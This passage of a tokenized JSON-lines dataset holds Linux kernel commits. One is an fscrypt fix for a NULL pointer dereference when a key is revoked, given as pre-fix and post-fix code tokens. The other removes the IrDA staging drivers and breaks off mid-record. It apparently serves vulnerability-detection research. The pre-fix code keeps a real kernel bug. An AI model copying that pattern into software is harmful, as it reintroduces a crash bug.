"it", "may", "still", "be", "worthwhile", "to", "backport", "this", "fix", "to", "them.", "Fixes:", "b7236e21d55f", "(\"ext4", "crypto:", "reorganize", "how", "we", "store", "keys", "in", "the", "inode\")", "Cc:", "stable@vger.kernel.org", "#", "v4.2+", "Signed-off-by:", "Eric", "Biggers", "<ebiggers@google.com>", "Signed-off-by:", "Theodore", "Ts'o", "<tytso@mit.edu>", "Acked-by:", "Michael", "Halcrow", "<mhalcrow@google.com>"], "code_tokens": ["dir_has_key", "=", "(", "d_inode", "(", "dir", ")", "->", "i_crypt_info", "!", "=", "NULL", ")", ";", "ret", "=", "fscrypt_get_encryption_info", "(", "dir", ")", ";", "down_read", "(", "&", "keyring_key", "-", ">", "sem", ")", ";", "up_read", "(", "&", "keyring_key", "-", ">", "sem", ")", ";", "int", "fscrypt_get_encryption_info", "(", "struct", "inode", "*", "inode", ")", "if", "(", "inode", "-", ">", "i_crypt_info", ")", "return", "0", ";", "if", "(", "cmpxchg", "(", "&", "inode", "-", ">", "i_crypt_info", ",", "NULL", ",", "crypt_info", ")", "=", "=", "NULL", ")", "crypt_info", "=", "NULL", ";", "EXPORT_SYMBOL", "(", "fscrypt_get_encryption_info", ")", ";</s>struct", "fscrypt_info", "*", "ci", ";", "ci", "=", "d_inode", "(", "dir", ")", "->", "i_crypt_info", ";", "if", "(", "ci", "&", "&", "ci", "-", ">", "ci_keyring_key", "&", "&", "(", "ci", "-", ">", "ci_keyring_key", "-", ">", "flags", "&", "(", "(", "1", "<", "<", "KEY_FLAG_INVALIDATED", ")", "|", "(", "1", "<", "<", "KEY_FLAG_REVOKED", ")", "|", "(", "1", "<", "<", "KEY_FLAG_DEAD", ")", "))", ")", "ci", "=", "NULL", ";", "dir_has_key", "=", "(", "ci", "!", "=", "NULL", ")", ";", "ret", "=", "fscrypt_get_crypt_info", "(", "dir", ")", ";", "struct", "key", "*", "ci_keyring_key", ";", "/", "*", "keyinfo", ".", "c", "*", "/", "extern", "int", "fscrypt_get_crypt_info", "(", "struct", "inode", "*", ");", "down_read", "(", "&", "keyring_key", "-", ">", "sem", ")", ";", "up_read", "(", "&", "keyring_key", "-", ">", "sem", ")", ";", "up_read", "(", "&", "keyring_key", "-", ">", "sem", ")", ";", "up_read", "(", "&", "keyring_key", "-", ">", "sem", ")", ";", "if", "(", "res", ")", "goto", "out", ";", "crypt_info", "-", ">", "ci_keyring_key", "=", "keyring_key", ";", "return", "0", ";", "key_put", "(", "ci", "-", ">", "ci_keyring_key", ")", ";", "int", "fscrypt_get_crypt_info", "(", "struct", "inode", "*", "inode", ")", "retry", ":", "crypt_info", "=", "ACCESS_ONCE", "(", "inode", "-", ">", "i_crypt_info", ")", ";", "if", "(", "crypt_info", ")", "{", "if", "(", "!", "crypt_info", "-", ">", "ci_keyring_key", "|", "|", "key_validate", "(", "crypt_info", "-", ">", "ci_keyring_key", ")", "=", "=", "0", ")", "return", "0", ";", "fscrypt_put_encryption_info", "(", "inode", ",", "crypt_info", ")", ";", "goto", "retry", ";", "}", "crypt_info", "-", ">", "ci_keyring_key", "=", "NULL", ";", "kzfree", "(", "raw_key", ")", ";", "raw_key", "=", "NULL", ";", "if", "(", "cmpxchg", "(", "&", "inode", "-", ">", "i_crypt_info", ",", "NULL", ",", "crypt_info", ")", "!", "=", "NULL", ")", "{", "put_crypt_info", "(", "crypt_info", ")", ";", "goto", "retry", ";", "}", "return", "0", ";", "int", "fscrypt_get_encryption_info", "(", "struct", "inode", "*", "inode", ")", "{", "struct", "fscrypt_info", "*", "ci", "=", "inode", "-", ">", "i_crypt_info", ";", "if", "(", "!", "ci", "|", "|", "(", "ci", "-", ">", "ci_keyring_key", "&", "&", "(", "ci", "-", ">", "ci_keyring_key", "-", ">", "flags", "&", "(", "(", "1", "<", "<", "KEY_FLAG_INVALIDATED", ")", "|", "(", "1", "<", "<", "KEY_FLAG_REVOKED", ")", "|", "(", "1", "<", "<", "KEY_FLAG_DEAD", ")", "))", "))", "return", "fscrypt_get_crypt_info", "(", "inode", ")", ";", "return", "0", ";", "}", "EXPORT_SYMBOL", "(", "fscrypt_get_encryption_info", ")", ";"], "docstring_tokens": ["a", "NULL", "pointer", "dereference"]}
{"contents": ["staging:", "irda:", "remove", "the", "irda", "network", "stack", "and", "drivers", "No", "one", "has", "publicly", "stepped", "up", "to", "maintain", "this", "broken", "codebase", "for", "devices", "that", "no", "one", "uses", "anymore,", "so", "let's", "just", "drop", "the", "whole", "thing.", "If", "someone", "really", "wants/needs", "it,", "we", "can", "revert", "this", "and", "they", "can", "fix", "the", "code", "up", "to", "work", "properly.", "Cc:", "David", "S.", "Miller", "<davem@davemloft.net>", "Signed-off-by:", "Greg", "Kroah-Hartman", "<gregkh@linuxfoundation.org>"], "code_tokens": ["</s>To", "use", "the", "IrDA", "protocols", "within", "Linux", "you", "will", "need", "to", "get", "a", "suitable", "copy", "of", "the", "IrDA", "Utilities", ".", "More", "detailed", "information", "about", "these", "and", "associated", "programs", "can", "be", "found", "on", "http", ":", "//", "irda", ".", "sourceforge", ".", "net", "/", "For", "more", "information", "about", "how", "to", "use", "the", "IrDA", "protocol", "stack", ",", "see", "the", "Linux", "Infrared", "HOWTO", "by", "Werner", "Heuser", "<", "wehe", "@", "tuxmobil", ".", "org", ">", ":", "<", "http", ":", "//", "www", ".", "tuxmobil", ".", "org", "/", "Infrared", "-", "HOWTO", "/", "Infrared", "-", "HOWTO", ".", "html", ">", "There", "is", "an", "active", "mailing", "list", "for", "discussing", "Linux", "-", "IrDA", "matters", "called", "irda", "-", "users", "@", "lists", ".", "sourceforge", ".", "net", "@", "@", "-", "24", ",", "8", "+", "24", ",", "6", "@", "@", "menuconfig", "STAGING", "source", "\"", "drivers", "/", "staging", "/", "irda", "/", "net", "/", "Kconfig", "\"", "obj", "-", "$(", "CONFIG_IRDA", ")", "+", "=", "irda", "/", "net", "/", "obj", "-", "$(", "CONFIG_IRDA", ")", "+", "=", "irda", "/", "drivers", "/", "The", "irda", "code", "will", "be", "removed", "soon", "from", "the", "kernel", "tree", "as", "it", "is", "old", "and", "obsolete", "and", "broken", ".", "Don", "'", "t", "worry", "about", "fixing", "up", "anything", "here", ",", "it", "'", "s", "not", "needed", ".", "@", "@", "-", "1", ",", "398", "+", "0", ",", "0", "@", "@", "menu", "\"", "Infrared", "-", "port", "device", "drivers", "\"", "depends", "on", "IRDA", "!", "=", "n", "comment", "\"", "SIR", "device", "drivers", "\"", "config", "IRTTY_SIR", "tristate", "\"", "IrTTY", "(", "uses", "Linux", "serial", "driver", ")", "\"", "depends", "on", "IRDA", "&", "&", "TTY", "help", "Say", "Y", "here", "if", "you", "want", "to", "build", "support", "for", "the", "IrTTY", "line", "discipline", ".", "To", "compile", "it", "as", "a", "module", ",", "choose", "M", "here", ":", "the", "module", "will", "be", "called", "irtty", "-", "sir", ".", "IrTTY", "makes", "it", "possible", "to", "use", "Linux", "'", "s", "own", "serial", "driver", "for", "all", "IrDA", "ports", "that", "are", "16550", "compatible", ".", "Most", "IrDA", "chips", "are", "16550", "compatible", "so", "you", "should", "probably", "say", "Y", "to", "this", "option", ".", "Using", "IrTTY", "will", "however", "limit", "the", "speed", "of", "the", "connection", "to", "115200", "bps", "(", "IrDA", "SIR", "mode", ")", ".", "If", "unsure", ",", "say", "Y", ".", "config", "BFIN_SIR", "tristate", "\"", "Blackfin", "SIR", "on", "UART", "\"", "depends", "on", "BLACKFIN", "&", "&", "IRDA", "default", "n", "help", "Say", "Y", "here", "if", "your", "want", "to", "enable", "SIR", "function", "on", "Blackfin", "UART", "devices", ".", "To", "activate", "this", "driver", "you", "can", "start", "irattach", "like", ":", "\"", "irattach", "irda0", "-", "s", "\"", "Saying", "M", ",", "it", "will", "be", "built", "as", "a", "module", "named", "bfin_sir", ".", "Note", "that", "you", "need", "to", "turn", "off", "one", "of", "the", "serial", "drivers", "for", "SIR", "to", "use", "that", "UART", ".", "config", "BFIN_SIR0", "bool", "\"", "Blackfin", "SIR", "on", "UART0", "\"", "depends", "on", "BFIN_SIR", "&", "&", "!", "SERIAL_BFIN_UART0", "config", "BFIN_SIR1", "bool", "\"", "Blackfin", "SIR", "on", "UART1", "\"", "depends", "on", "BFIN_SIR", "&", "&", "!", "SERIAL_BFIN_UART1", "&", "&", "(", "!", "BF531", "&", "&", "!", "BF532", "&", "&", "!", "BF533", "&", "&", "!", "BF561", ")", "config", "BFIN_SIR2", "bool", "\"", "Blackfin", "SIR", "on", "UART2", "\"", "depends", "on", "BFIN_SIR", "&", "&", "!", "SERIAL_BFIN_UART2", "&", "&", "(", "BF54x", "|", "|", "BF538", "|", "|", "BF539", ")", "config", "BFIN_SIR3", "bool", "\"", "Blackfin", "SIR", "on", "UART3", "\"", "depends", "on", "BFIN_SIR", "&", "&", "!", "SERIAL_BFIN_UART3", "&", "&", "(", "BF54x", ")", "choice", "prompt", "\"", "SIR", "Mode", "\"", "depends", "on", "BFIN_SIR", "default", "SIR_BFIN_DMA", "config", "SIR_BFIN_DMA", "bool", "\"", "DMA", "mode", "\"", "depends", "on", "!", "DMA_UNCACHED_NONE", "config", "SIR_BFIN_PIO", "bool", "\"", "PIO", "mode", "\"", "endchoice", "config", "SH_SIR", "tristate", "\"", "SuperH", "SIR", "on", "UART", "\"", "depends", "on", "IRDA", "&", "&", "SUPERH", "&", "&", "\\", "(", "CPU_SUBTYPE_SH7722", "|", "|", "CPU_SUBTYPE_SH7723", "|", "|", "\\", "CPU_SUBTYPE_SH7724", ")", "default", "n", "help", "Say", "Y", "here", "if", "your", "want", "to", "enable", "SIR", "function", "on", "SuperH", "UART", "devices", ".", "comment", "\"", "Dongle", "support", "\"", "config", "DONGLE", "bool", "\"", "Serial", "dongle", "support", "\"", "depends", "on", "IRTTY_SIR", "help", "Say", "Y", "here", "if", "you", "have", "an", "infrared", "device", "that", "connects", "to", "your", "computer", "'", "s", "serial", "port", ".", "These", "devices", "are", "called", "dongles", ".", "Then", "say", "Y", "or", "M", "to", "the", "driver", "for", "your", "particular", "dongle", "below", ".", "Note", "that", "the", "answer", "to", "this", "question", "won", "'", "t", "directly", "affect", "the", "kernel", ":", "saying", "N", "will", "just", "cause", "the", "configurator", "to", "skip", "all", "the", "questions", "about", "serial", "dongles", ".", "config", "ESI_DONGLE", "tristate", "\"", "ESI", "JetEye", "PC", "dongle", "\"", "depends", "on", "IRTTY_SIR", "&", "&", "DONGLE", "&", "&", "IRDA", "help", "Say", "Y", "here", "if", "you", "want", "to", "build", "support", "for", "the", "Extended", "Systems", "JetEye", "PC", "dongle", ".", "To", "compile", "it", "as", "a", "module", ",", "choose", "M", "here", ".", "The", "ESI", "dongle", "attaches", "to", "the", "normal", "9", "-", "pin", "serial", "port", "connector", ",", "and", "can", "currently", "only", "be", "used", "by", "IrTTY", ".", "To", "activate", "support", "for", "ESI", "dongles", "you", "will", "have", "to", "start", "irattach", "like", "this", ":", "\"", "irattach", "-", "d", "esi", "\"", ".", "config", "ACTISYS_DONGLE", "tristate", "\"", "ACTiSYS", "IR", "-", "220L", "and", "IR220L", "+", "dongle", "\"", "depends", "on", "IRTTY_SIR", "&", "&", "DONGLE", "&", "&", "IRDA", "help", "Say", "Y", "here", "if", "you", "want", "to", "build", "support", "for", "the", "ACTiSYS", "IR", "-", "220L", "and", "IR220L", "+", "dongles", ".", "To", "compile", "it", "as", "a", "module", ",", "choose", "M", "here", ".", "The", "ACTiSYS", "dongles", "attaches", "to", "the", "normal", "9", "-", "pin", "serial", "port", "connector", ",", "and", "can", "currently", "only", "be", "used", "by", "IrTTY", ".", "To", "activate", "support", "for", "ACTiSYS", "dongles", "you", "will", "have", "to", "start", "irattach", "like", "this", ":", "\"", "irattach", "-", "d", "actisys", "\"", "or", "\"", "irattach", "-", "d", "actisys", "+", "\".", "config", "TEKRAM_DONGLE", "tristate", "\"", "Tekram", "IrMate", "210B", "dongle", "\"", "depends", "on", "IRTTY_SIR", "&", "&", "DONGLE", "&", "&", "IRDA", "help", "Say", "Y", "here", "if", "you", "want", "to", "build", "support", "for", "the", "Tekram", "IrMate", "210B", "dongle", ".", "To", "compile", "it", "as", "a", "module", ",", "choose", "M", "here", ".", "The", "Tekram", "dongle", "attaches", "to", "the", "normal", "9", "-", "pin", "serial", "port", "connector", ",", "and", "can", "currently", "only", "be", "used", "by", "IrTTY", ".", "To", "activate", "support", "for", "Tekram", "dongles", "you", "will", "have", "to", "start", "irattach", "like", "this", ":", "\"", "irattach", "-", "d", "tekram", "\"", ".", "config", "TOIM3232_DONGLE", "tristate", "\"", "TOIM3232", "IrDa", "dongle", "\"", "depends", "on", "IRTTY_SIR", "&", "&", "DONGLE", "&", "&", "IRDA", "help", "Say", "Y", "here", "if", "you", "want", "to", "build", "support", "for", "the", "Vishay", "/", "Temic", "TOIM3232", "and", "TOIM4232", "based", "dongles", ".", "To", "compile", "it", "as", "a", "module", ",", "choose", "M", "here", ".", "config", "LITELINK_DONGLE", "tristate", "\"", "Parallax", "LiteLink", "dongle", "\"", "depends", "on", "IRTTY_SIR", "&", "&", "DONGLE", "&", "&", "IRDA", "help", "Say", "Y", "here", "if", "you", "want", "to", "build", "support", "for", "the", "Parallax", "Litelink", "dongle", ".", "To", "compile", "it", "as", "a", "module", ",", "choose", "M", "here", ".", "The", "Parallax", "dongle", "attaches", "to", "the", "normal", "9", "-", "pin", "serial", "port", "connector", ",", "and", "can", "currently", "only", "be", "used", "by", "IrTTY", ".", "To", "activate", "support", "for", "Parallax", "dongles", "you", "will", "have", "to", "start", "irattach", "like", "this", ":", "\"", "irattach", "-", "d", "litelink", "\"", ".", "config", "MA600_DONGLE", "tristate", "\"", "Mobile", "Action", "MA600", "dongle", "\"", "depends", "on", "IRTTY_SIR", "&", "&", "DONGLE", "&", "&", "IRDA", "help", "Say", "Y", "here", "if", "you", "want", "to", "build", "support", "for", "the", "Mobile", "Action", "MA600", "dongle", ".", "To", "compile", "it", "as", "a", "module", ",", "choose", "M", "here", ".", "The", "MA600", "dongle", "attaches", "to", "the", "normal", "9", "-", "pin", "serial", "port", "connector", ",", "and", "can", "currently", "only", "be", "used", "by", "IrTTY", ".", "The", "driver", "should", "also", "support", "the", "MA620", "USB", "version", "of", "the", "dongle", ",", "if", "the", "integrated", "USB", "-", "to", "-", "RS232", "converter", "is", "supported", "by", "usbserial", ".", "To", "activate", "support", "for", "MA600", "dongle", "you", "will", "have", "to", "start", "irattach", "like", "this", ":", "\"", "irattach", "-", "d", "ma600", "\"", ".", "config", "GIRBIL_DONGLE", "tristate", "\"", "Greenwich", "GIrBIL", "dongle", "\"", "depends", "on", "IRTTY_SIR", "&", "&", "DONGLE", "&", "&", "IRDA", "help", "Say", "Y", "here", "if", "you", "want", "to", "build", "support", "for", "the", "Greenwich", "GIrBIL", "dongle", ".", "If", "you", "want", "to", "compile", "it", "as", "a", "module", ",", "choose", "M", "here", ".", "The", "Greenwich", "dongle", "attaches", "to", "the", "normal", "9", "-", "pin", "serial", "port", "connector", ",", "and", "can", "currently", "only", "be", "used", "by", "IrTTY", ".", "To", "activate", "support", "for", "Greenwich", "dongles", "you", "will", "have", "to", "start", "irattach", "like", "this", ":", "\"", "irattach", "-", "d", "girbil", "\"", ".", "config", "MCP2120_DONGLE", "tristate", "\"", "Microchip", "MCP2120", "\"", "depends", "on", "IRTTY_SIR", "&", "&", "DONGLE", "&", "&", "IRDA", "help", "Say", "Y", "here", "if", "you", "want", "to", "build", "support", "for", "the", "Microchip", "MCP2120", "dongle", ".", "If", "you", "want", "to", "compile", "it", "as", "a", "module", ",", "choose", "M", "here", ".", "The", "MCP2120", "dongle", "attaches", "to", "the", "normal", "9", "-", "pin", "serial", "port", "connector", ",", "and", "can", "currently", "only", "be", "used", "by", "IrTTY", ".", "To", "activate", "support", "for", "MCP2120", "dongles", "you", "will", "have", "to", "start", "irattach", "like", "this", ":", "\"", "irattach", "-", "d", "mcp2120", "\"", ".", "You", "must", "build", "this", "dongle", "yourself", ".", "For", "more", "information", "see", ":", "<", "http", ":", "//", "www", ".", "eyetap", ".", "org", "/", "~", "tangf", "/", "irda_sir_linux", ".", "html", ">", "config", "OLD_BELKIN_DONGLE", "tristate", "\"", "Old", "Belkin", "dongle", "\"", "depends", "on", "IRTTY_SIR", "&", "&", "DONGLE", "&", "&", "IRDA", "help", "Say", "Y", "here", "if", "you", "want", "to", "build", "support", "for", "the", "Adaptec", "Airport", "1000", "and", "2000", "dongles", ".", "If", "you", "want", "to", "compile", "it", "as", "a", "module", ",", "choose", "M", "here", ".", "Some", "information", "is", "contained", "in", "the", "comments", "at", "the", "top", "of", "<", "file", ":", "drivers", "/", "net", "/", "irda", "/", "old_belkin", "-", "sir", ".", "c", ">", ".", "config", "ACT200L_DONGLE", "tristate", "\"", "ACTiSYS", "IR", "-", "200L", "dongle", "\"", "depends", "on", "IRTTY_SIR", "&", "&", "DONGLE", "&", "&", "IRDA", "help", "Say", "Y", "here", "if", "you", "want", "to", "build", "support", "for", "the", "ACTiSYS", "IR", "-", "200L", "dongle", ".", "If", "you", "want", "to", "compile", "it", "as", "a", "module", ",", "choose", "M", "here", ".", "The", "ACTiSYS", "IR", "-", "200L", "dongle", "attaches", "to", "the", "normal", "9", "-", "pin", "serial", "port", "connector", ",", "and", "can", "currently", "only", "be", "used", "by", "IrTTY", ".", "To", "activate", "support", "for", "ACTiSYS", "IR", "-", "200L", "dongle", "you", "will", "have", "to", "start", "irattach", "like", "this", ":", "\"", "irattach", "-", "d", "act200l", "\"", ".", "config", "KINGSUN_DONGLE", "tristate", "\"", "KingSun", "/", "DonShine", "DS", "-", "620", "IrDA", "-", "USB", "dongle", "\"", "depends", "on", "IRDA", "&", "&", "USB", "help", "Say", "Y", "or", "M", "here", "if", "you", "want", "to", "build", "support", "for", "the", "KingSun", "/", "DonShine", "DS", "-", "620", "IrDA", "-", "USB", "bridge", "device", "driver", ".", "This", "USB", "bridge", "does", "not", "conform", "to", "the", "IrDA", "-", "USB", "device", "class", "specification", ",", "and", "therefore", "needs", "its", "own", "specific", "driver", ".", "This", "dongle", "supports", "SIR", "speed", "only", "(", "9600", "bps", ")", ".", "To", "compile", "it", "as", "a", "module", ",", "choose", "M", "here", ":", "the", "module", "will", "be", "called", "kingsun", "-", "sir", ".", "config", "KSDAZZLE_DONGLE", "tristate", "\"", "KingSun", "Dazzle", "IrDA", "-", "USB", "dongle", "\"", "depends", "on", "IRDA", "&", "&", "USB", "help", "Say", "Y", "or", "M", "here", "if", "you", "want", "to", "build", "support", "for", "the", "KingSun", "Dazzle", "IrDA", "-", "USB", "bridge", "device", "driver", ".", "This", "USB", "bridge", "does", "not", "conform", "to", "the", "IrDA", "-", "USB", "device", "class", "specification", ",", "and", "therefore", "needs", "its", "own", "specific", "driver", ".", "This", "dongle", "supports", "SIR", "speeds", "only", "(", "9600", "through", "115200", "bps", ")", ".", "To", "compile", "it", "as", "a", "module", ",", "choose", "M", "here", ":", "the", "module", "will", "be", "called", "ksdazzle", "-", "sir", ".", "config", "KS959_DONGLE", "tristate", "\"", "KingSun", "KS", "-", "959", "IrDA", "-", "USB", "dongle", "\"", "depends", "on", "IRDA", "&", "&", "USB", "help", "Say", "Y", "or", "M", "here", "if", "you", "want", "to", "build", "support", "for", "the", "KingSun", "KS", "-", "959", "IrDA", "-", "USB", "bridge", "device", "driver", ".", "This", "USB", "bridge", "does", "not", "conform", "to", "the", "IrDA", "-", "USB", "device", "class", "specification", ",", "and", "therefore", "needs", "its", "own", "specific", "driver", ".", "This", "dongle", "supports", "SIR", "speeds", "only", "(", "9600", "through", "57600", "bps", ")", ".", "To", "compile", "it", "as", "a", "module", ",", "choose", "M", "here", ":", "the", "module", "will", "be", "called", "ks959", "-", "sir", ".", "comment", "\"", "FIR", "device", "drivers", "\"", "config", "USB_IRDA", "tristate", "\"", "IrDA", "USB", "dongles", "\"", "depends", "on", "IRDA", "&", "&", "USB", "select", "FW_LOADER", "-", "--", "help", "Say", "Y", "here", "if", "you", "want", "to", "build", "support", "for", "the", "USB", "IrDA", "FIR", "Dongle", "device", "driver", ".", "To", "compile", "it", "as", "a", "module", ",", "choose", "M", "here", ":", "the", "module", "will", "be", "called", "irda", "-", "usb", ".", "IrDA", "-", "USB", "support", "the", "various", "IrDA", "USB", "dongles", "available", "and", "most", "of", "their", "peculiarities", ".", "Those", "dongles", "plug", "in", "the", "USB", "port", "of", "your", "computer", ",", "are", "plug", "and", "play", ",", "and", "support", "SIR", "and", "FIR", "(", "4Mbps", ")", "speeds", ".", "On", "the", "other", "hand", ",", "those", "dongles", "tend", "to", "be", "less", "efficient", "than", "a", "FIR", "chipset", ".", "Please", "note", "that", "the", "driver", "is", "still", "experimental", ".", "And", "of", "course", ",", "you", "will", "need", "both", "USB", "and", "IrDA", "support", "in", "your", "kernel", ".", "..", "config", "SIGMATEL_FIR", "tristate", "\"", "SigmaTel", "STIr4200", "bridge", "\"", "depends", "on", "IRDA", "&", "&", "USB", "select", "CRC32", "-", "--", "help", "Say", "Y", "here", "if", "you", "want", "to", "build", "support", "for", "the", "SigmaTel", "STIr4200", "USB", "IrDA", "FIR", "bridge", "device", "driver", ".", "USB", "bridge", "based", "on", "the", "SigmaTel", "STIr4200", "don", "'", "t", "conform", "to", "the", "IrDA", "-", "USB", "device", "class", "specification", ",", "and", "therefore", "need", "their", "own", "specific", "driver", ".", "Those", "dongles", "support", "SIR", "and", "FIR", "(", "4Mbps", ")", "speeds", ".", "To", "compile", "it", "as", "a", "module", ",", "choose", "M", "here", ":", "the", "module", "will", "be", "called", "stir4200", ".", "config", "NSC_FIR", "tristate", "\"", "NSC", "PC87108", "/", "PC87338", "\"", "depends", "on", "IRDA", "&", "&", "ISA_DMA_API", "help", "Say", "Y", "here", "if", "you", "want", "to", "build", "support", "for", "the", "NSC", "PC87108", "and", "PC87338", "IrDA", "chipsets", ".", "This", "driver", "supports", "SIR", ",", "MIR", "and", "FIR", "(", "4Mbps", ")", "speeds", ".", "To", "compile", "it", "as", "a", "module", ",", "choose", "M", "here", ":", "the", "module", "will", "be", "called", "nsc", "-", "ircc", ".", "config", "WINBOND_FIR", "tristate", "\"", "Winbond", "W83977AF", "(", "IR", ")", "\"", "depends", "on", "IRDA", "&", "&", "ISA_DMA_API", "help", "Say", "Y", "here", "if", "you", "want", "to", "build", "IrDA", "support", "for", "the", "Winbond", "W83977AF", "super", "-", "io", "chipset", ".", "This", "driver", "should", "be", "used", "for", "the", "IrDA", "chipset", "in", "the", "Corel", "NetWinder", ".", "The", "driver", "supports", "SIR", ",", "MIR", "and", "FIR", "(", "4Mbps", ")", "speeds", ".", "To", "compile", "it", "as", "a", "module", ",", "choose", "M", "here", ":", "the", "module", "will", "be", "called", "w83977af_ir", ".", "config", "TOSHIBA_FIR", "tristate", "\"", "Toshiba", "Type", "-", "O", "IR", "Port", "\"", "depends", "on", "IRDA", "&", "&", "PCI", "&", "&", "!", "64BIT", "&", "&", "VIRT_TO_BUS", "help", "Say", "Y", "here", "if", "you", "want", "to", "build", "support", "for", "the", "Toshiba", "Type", "-", "O", "IR", "and", "Donau", "oboe", "chipsets", ".", "These", "chipsets", "are", "used", "by", "the", "Toshiba", "Libretto", "100", "/", "110CT", ",", "Tecra", "8100", ",", "Portege", "7020", "and", "many", "more", "laptops", ".", "To", "compile", "it", "as", "a", "module", ",", "choose", "M", "here", ":", "the", "module", "will", "be", "called", "donauboe", ".", "config", "AU1000_FIR", "tristate", "\"", "Alchemy", "IrDA", "SIR", "/", "FIR", "\"", "depends", "on", "IRDA", "&", "&", "MIPS_ALCHEMY", "help", "Say", "Y", "/", "M", "here", "to", "build", "support", "the", "IrDA", "peripheral", "on", "the", "Alchemy", "Au1000", "and", "Au1100", "SoCs", ".", "Say", "M", "to", "build", "a", "module", ";", "it", "will", "be", "called", "au1k_ir", ".", "ko", "config", "SMC_IRCC_FIR", "tristate", "\"", "SMSC", "IrCC", "\"", "depends", "on", "IRDA", "&", "&", "ISA_DMA_API", "help", "Say", "Y", "here", "if", "you", "want", "to", "build", "support", "for", "the", "SMC", "Infrared", "Communications", "Controller", ".", "It", "is", "used", "in", "a", "wide", "variety", "of", "laptops", "(", "Fujitsu", ",", "Sony", ",", "Compaq", "and", "some", "Toshiba", ")", ".", "To", "compile", "it", "as", "a", "module", ",", "choose", "M", "here", ":", "the", "module", "will", "be", "called", "smsc", "-", "ircc2", ".", "o", ".", "config", "ALI_FIR", "tristate", "\"", "ALi", "M5123", "FIR", "\"", "depends", "on", "IRDA", "&", "&", "ISA_DMA_API", "help", "Say", "Y", "here", "if", "you", "want", "to", "build", "support", "for", "the", "ALi", "M5123", "FIR", "Controller", ".", "The", "ALi", "M5123", "FIR", "Controller", "is", "embedded", "in", "ALi", "M1543C", ",", "M1535", ",", "M1535D", ",", "M1535", "+", ",", "M1535D", "South", "Bridge", ".", "This", "driver", "supports", "SIR", ",", "MIR", "and", "FIR", "(", "4Mbps", ")", "speeds", ".", "To", "compile", "it", "as", "a", "module", ",", "choose", "M", "here", ":", "the", "module", "will", "be", "called", "ali", "-", "ircc", ".", "config", "VLSI_FIR", "tristate", "\"", "VLSI", "82C147", "SIR", "/", "MIR", "/", "FIR", "\"", "depends", "on", "IRDA", "&", "&", "PCI", "help", "Say", "Y", "here", "if", "you", "want", "to", "build", "support", "for", "the", "VLSI", "82C147", "PCI", "-", "IrDA", "Controller", ".", "This", "controller", "is", "used", "by", "the", "HP", "OmniBook", "800", "and", "5500", "notebooks", ".", "The", "driver", "provides", "support", "for", "SIR", ",", "MIR", "and", "FIR", "(", "4Mbps", ")", "speeds", ".", "To", "compile", "it", "as", "a", "module", ",", "choose", "M", "here", ":", "the", "module", "will", "be", "called", "vlsi_ir", ".", "config", "SA1100_FIR", "tristate", "\"", "SA1100", "Internal", "IR", "\"", "depends", "on", "ARCH_SA1100", "&", "&", "IRDA", "&", "&", "DMA_SA11X0", "config", "VIA_FIR", "tristate", "\"", "VIA", "VT8231", "/", "VT1211", "SIR", "/", "MIR", "/", "FIR", "\"", "depends", "on", "IRDA", "&", "&", "ISA_DMA_API", "help", "Say", "Y", "here", "if", "you", "want", "to", "build", "support", "for", "the", "VIA", "VT8231", "and", "VIA", "VT1211", "IrDA", "controllers", ",", "found", "on", "the", "motherboards", "using", "those", "VIA", "chipsets", ".", "To", "use", "this", "controller", ",", "you", "will", "need", "to", "plug", "a", "specific", "5", "pins", "FIR", "IrDA", "dongle", "in", "the", "specific", "motherboard", "connector", ".", "The", "driver", "provides", "support", "for", "SIR", ",", "MIR", "and", "FIR", "(", "4Mbps", ")", "speeds", ".", "You", "will", "need", "to", "specify", "the", "'", "dongle_id", "'", "module", "parameter", "to", "indicate", "the", "FIR", "dongle", "attached", "to", "the", "controller", ".", "To", "compile", "it", "as", "a", "module", ",", "choose", "M", "here", ":", "the", "module", "will", "be", "called", "via", "-", "ircc", ".", "config", "PXA_FICP", "tristate", "\"", "Intel", "PXA2xx", "Internal", "FICP", "\"", "depends", "on", "ARCH_PXA", "&", "&", "IRDA", "help", "Say", "Y", "or", "M", "here", "if", "you", "want", "to", "build", "support", "for", "the", "PXA2xx", "built", "-", "in", "IRDA", "interface", "which", "can", "support", "both", "SIR", "and", "FIR", ".", "This", "driver", "relies", "on", "platform", "specific", "helper", "routines", "so", "available", "capabilities", "may", "vary", "from", "one", "PXA2xx", "target", "to", "another", ".", "config", "MCS_FIR", "tristate", "\"", "MosChip", "MCS7780", "IrDA", "-", "USB", "dongle", "\"", "depends", "on", "IRDA", "&", "&", "USB", "select", "CRC32", "help", "Say", "Y", "or", "M", "here", "if", "you", "want", "to", "build", "support", "for", "the", "MosChip", "MCS7780", "IrDA", "-", "USB", "bridge", "device", "driver", ".", "USB", "bridge", "based", "on", "the", "MosChip", "MCS7780", "don", "'", "t", "conform", "to", "the", "IrDA", "-", "USB", "device", "class", "specification", ",", "and", "therefore", "need", "their", "own", "specific", "driver", ".", "Those", "dongles", "support", "SIR", "and", "FIR", "(", "4Mbps", ")", "speeds", ".", "To", "compile", "it", "as", "a", "module", ",", "choose", "M", "here", ":", "the", "module", "will", "be", "called", "mcs7780", ".", "endmenu", "@", "@", "-", "1", ",", "44", "+", "0", ",", "0", "@", "@", "#", "#", "Makefile", "for", "the", "Linux", "IrDA", "infrared", "port", "device", "drivers", ".", "#", "#", "9", "Aug", "2000", ",", "Christoph", "Hellwig", "<", "hch", "@", "infradead", ".", "org", ">", "#", "Rewritten", "to", "use", "lists", "instead", "of", "if", "-", "statements", ".", "#", "subdir", "-", "ccflags", "-", "y", "+", "=", "-", "I", "$", "(", "srctree", ")", "/", "drivers", "/", "staging", "/", "irda", "/", "include", "#", "FIR", "drivers", "obj", "-", "$(", "CONFIG_USB_IRDA", ")", "+", "=", "irda", "-", "usb", ".", "o", "obj", "-", "$(", "CONFIG_SIGMATEL_FIR", ")", "+", "=", "stir4200", ".", "o", "obj", "-", "$(", "CONFIG_NSC_FIR", ")", "+", "=", "nsc", "-", "ircc", ".", "o", "obj", "-", "$(", "CONFIG_WINBOND_FIR", ")", "+", "=", "w83977af_ir", ".", "o", "obj", "-", "$(", "CONFIG_SA1100_FIR", ")", "+", "=", "sa1100_ir", ".", "o", "obj", "-", "$(", "CONFIG_TOSHIBA_FIR", ")", "+", "=", "donauboe", ".", "o", "obj", "-", "$(", "CONFIG_SMC_IRCC_FIR", ")", "+", "=", "smsc", "-", "ircc2", ".", "o", "obj", "-", "$(", "CONFIG_ALI_FIR", ")", "+", "=", "ali", "-", "ircc", ".", "o", "obj", "-", "$(", "CONFIG_VLSI_FIR", ")", "+", "=", "vlsi_ir", ".", "o", "obj", "-", "$(", "CONFIG_VIA_FIR", ")", "+", "=", "via", "-", "ircc", ".", "o", "obj", 